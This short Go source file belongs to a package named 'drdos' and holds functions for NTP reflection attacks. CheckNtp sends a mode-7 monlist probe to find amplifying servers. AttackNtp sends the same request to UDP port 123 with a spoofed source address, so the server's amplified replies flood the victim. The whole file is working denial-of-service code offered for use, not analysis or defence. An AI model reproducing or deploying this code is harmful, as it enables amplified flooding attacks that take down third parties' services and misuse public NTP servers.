package drdos

import (
	"drdos/config"
	"drdos/utils"
)

func CheckNtp(dstip string, srcip string) error {
	payload := []byte{23, 0, 3, 42}
	for i := 0; i < 188; i++ {
		payload = append(payload, 0x00)
	}
	dport := 0x7b
	return utils.SendUdpPack(dstip, srcip, dport, config.ListenPort, payload)
}

func AttackNtp(dstip string, srcip string, port int) error {
	payload := []byte{23, 0, 3, 42}
	for i := 0; i < 80; i++ {
		payload = append(payload, 0x00)
	}
	dport := 0x7b
	return utils.SendUdpPack(dstip, srcip, dport, port, payload)
}
